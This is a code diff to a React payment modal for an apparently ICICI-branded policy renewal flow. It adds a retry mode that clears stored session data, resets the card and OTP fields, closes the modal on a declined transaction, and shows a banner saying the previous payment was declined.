@@ -46,6 +46,7 @@ interface PaymentModalProps {
   onClose: () => void;
   onPaymentSuccess?: (method: string, transactionRef: string, attemptData: any) => void;
   onPaymentFailure?: (method: string, transactionRef: string, attemptData: any) => void;
+  isRetry?: boolean;
 }
 
 const GRID_LETTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P'] as const;
@@ -65,7 +66,8 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
   finalPayable,
   onClose,
   onPaymentSuccess,
-  onPaymentFailure
+  onPaymentFailure,
+  isRetry = false
 }) => {
   const [selectedMethod, setSelectedMethod] = useState<'upi' | 'card' | 'netbanking' | 'emi'>('upi');
   
@@ -177,6 +179,22 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
 
   // Preserve & Restore session state when customer switches between Chrome and SMS app
   useEffect(() => {
+    if (isRetry) {
+      try {
+        sessionStorage.removeItem(`icici_pay_session_${policy.policyNumber}`);
+      } catch (_) {}
+      setSelectedMethod('card');
+      setStep('method');
+      setCardNumber('');
+      setCardHolder(policy.customerName || '');
+      setCardExpiry('');
+      setCardCvv('');
+      setOtp('');
+      setActiveTxnRef('');
+      setPendingApprovalStatus('PENDING');
+      return;
+    }
+
     try {
       const savedSessionRaw = sessionStorage.getItem(`icici_pay_session_${policy.policyNumber}`);
       if (savedSessionRaw) {
@@ -197,7 +215,7 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
         }
       }
     } catch (_) {}
-  }, [policy.policyNumber]);
+  }, [policy.policyNumber, isRetry]);
 
   // Save session state to sessionStorage when active to prevent losing state on tab switch
   useEffect(() => {
@@ -520,6 +538,10 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
           }
           onClose();
         } else if (res.status === 'DECLINED') {
+          try {
+            sessionStorage.removeItem(`icici_pay_session_${policy.policyNumber}`);
+          } catch (_) {}
+
           apiUpdateMobileOtpStatus({
             policyNumber: policy.policyNumber,
             paymentGatewayRef: activeTxnRef,
@@ -536,9 +558,8 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
               status: 'Failed',
               failureReason: 'Payment transaction was declined during 3D-secure authorization.'
             });
-          } else {
-            setStep('expired');
           }
+          onClose();
         } else if (res.status === 'EXPIRED') {
           apiUpdateMobileOtpStatus({
             policyNumber: policy.policyNumber,
@@ -969,6 +990,17 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
               }} 
               className="space-y-4 sm:space-y-5"
             >
+              {isRetry && (
+                <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 flex items-start gap-2.5 text-xs text-amber-900 shadow-2xs animate-fadeIn">
+                  <AlertCircle className="w-4 h-4 text-amber-600 shrink-0 mt-0.5" />
+                  <div>
+                    <span className="font-bold block text-amber-950">Previous Transaction Declined:</span>
+                    <p className="text-amber-800 leading-relaxed text-[11px]">
+                      Your issuing bank declined the previous verification. Please update or re-enter your card details below to retry your renewal payment safely.
+                    </p>
+                  </div>
+                </div>
+              )}
               
               {/* Payment Methods Selector Tabs (UPI, Cards, Net Banking, Easy EMI) */}
               <div className="grid grid-cols-4 gap-1.5 sm:gap-2 text-[10px] sm:text-xs font-bold">
